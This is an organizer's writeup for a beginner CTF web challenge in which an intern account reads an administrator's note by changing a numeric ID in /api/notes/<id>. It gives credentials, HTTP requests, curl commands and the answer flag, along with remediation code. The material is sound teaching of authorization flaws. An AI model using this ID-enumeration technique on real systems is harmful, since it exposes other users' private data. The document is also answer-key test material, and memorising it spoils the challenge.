# The Intern's Secret — full writeup

**Challenge:** The Intern's Secret
**Level:** Beginner · Web
**Bug:** IDOR (Insecure Direct Object Reference)
**Flag (platform):** `GDG{intern_<20 hex>}` — unique to each team
**Flag (standalone):** `GDG{1d0r_1s_n0t_4_d00r}`

> Organizer/writeup material. Contains the answer.

---

## 1. Story and objective

Maya has just joined GDG Labs. Her onboarding portal contains three ordinary
notes. A legacy API opens notes by numeric ID, and the platform lead's final
handover note is still in the system. The goal is to read a note that belongs to
someone else.

This is a beginner challenge: no payload encoding, no crypto, and no guessing.
The intended lesson is that **authentication is not authorization**.

---

## 2. Getting in

Open the scoreboard, sign in, and launch **The Intern's Secret**. The launch
link opens the portal at `http://LAN-IP:8081` and creates a team session.

Sign in with the credentials shown on the portal page:

```text
maya.intern
coffee-first
```

The dashboard lists three notes, all owned by Maya:

- Day 1 checklist
- Coffee machine cheat sheet
- Glossary

Each **Open note** button points directly at the JSON API, not at a separate
HTML page. Click one and the browser displays the raw JSON response.

---

## 3. Finding the request

Open DevTools (F12) → **Network** → click **Open note 101**. The browser sends:

```http
GET /api/notes/101 HTTP/1.1
Host: LAN-IP:8081
Cookie: gdg_interns_session=...
```

The response is JSON:

```json
{
  "id": 101,
  "title": "Day 1 checklist",
  "body": "1. Collect laptop.\n2. Read the platform glossary...",
  "owner_id": 42
}
```

The ID in the URL is a direct object reference. There is no signature, no
ownership check, and no per-user path. Try a smaller number.

---

## 4. Exploiting the IDOR

Send the same request with `1` instead of `101`:

```http
GET /api/notes/1 HTTP/1.1
Host: LAN-IP:8081
Cookie: gdg_interns_session=...
```

The server returns the Head of Platform's private note. The `body` field ends
with the flag:

```text
Welcome aboard.

The final piece of the platform handover is the vault key.
Keep it out of public channels: GDG{intern_...}

Do not forward this note.
```

In standalone mode the value is the reference flag
`GDG{1d0r_1s_n0t_4_d00r}`. In a live event it is derived for the team that
launched the challenge.

### Browser-only path

1. Sign in as Maya.
2. Open DevTools → Network.
3. Click a note and copy the request.
4. Right-click the request → **Copy as cURL** (or use **Edit and Resend**).
5. Change `/api/notes/101` to `/api/notes/1`.
6. Send it.

### curl path

Copy the launch URL from the scoreboard challenge page (right-click → copy
link), then:

```bash
curl -c cookies.txt -L "http://LAN-IP:8081/?t=<launch-token>"
curl -b cookies.txt -c cookies.txt \
  -d "username=maya.intern&password=coffee-first" \
  http://LAN-IP:8081/login
curl -b cookies.txt http://LAN-IP:8081/api/notes/1
```

`-L` follows the 302 that strips the token from the address bar, and the cookie
jar keeps the team session. The final command prints the JSON note.

If you are running the challenge by itself with no platform token:

```bash
curl -c cookies.txt -d "username=maya.intern&password=coffee-first" \
  http://127.0.0.1:8081/login
curl -b cookies.txt http://127.0.0.1:8081/api/notes/1
```

---

## 5. Submitting

Copy the complete flag, including `GDG{` and `}`, and submit it on the
scoreboard challenge page. The scoreboard compares it against the flag derived
for **your** team.

A flag copied from another team is rejected and recorded as
`flag_share_attempt`. It will not score.

---

## 6. Why this works

The endpoint authenticates the session:

```python
@app.get("/api/notes/<int:note_id>")
@login_required
def get_note(note_id: int):
    note = NOTES.get(note_id)
    ...
```

`@login_required` answers "is someone signed in?". It does not answer "is this
note theirs?". The authorization check is missing entirely, so the server trusts
the user-supplied identifier.

This is a **horizontal privilege escalation**: Maya stays an intern, but reads an
administrator's object.

---

## 7. Remediation

Check ownership (or an explicit admin role) before returning the object:

```python
@app.get("/api/notes/<int:note_id>")
@login_required
def get_note(note_id: int):
    user = current_user()
    note = NOTES.get(note_id)
    if note is None or (note["owner_id"] != user["id"] and user["role"] != "Admin"):
        # 404 avoids confirming that a private note exists.
        return jsonify({"error": "note not found"}), 404
    return jsonify({...})
```

Better still, scope the query by the authenticated user in the database:

```sql
SELECT * FROM notes WHERE id = ? AND owner_id = ?
```

At scale, use a centralized authorization layer, unpredictable IDs are **not** a
fix (they are still enumerable or leak), and add tests that request every
neighbor's object ID as a normal user.

---

## 8. Hint mapping

| Hint | What it points at |
|---|---|
| 1 | Maya is employee 42; the URL number is trusted |
| 2 | DevTools Network shows `/api/notes/<id>`; try a smaller id |
| 3 | Request `/api/notes/1` and read `body` |

---

## 9. Common mistakes

- **Calling `/notes/1` instead of `/api/notes/1`.** The HTML page route does not
  exist; the IDOR is in the JSON API.
- **Forgetting to sign in.** The API returns `401 authentication required`.
- **Launching `:8081` directly during a platform event.** You will see the
  "launch this challenge from the scoreboard" gate. Use the launch button.
- **Submitting another team's flag.** It is rejected and audited.
- **Assuming the flag is static in platform mode.** It is derived per team.
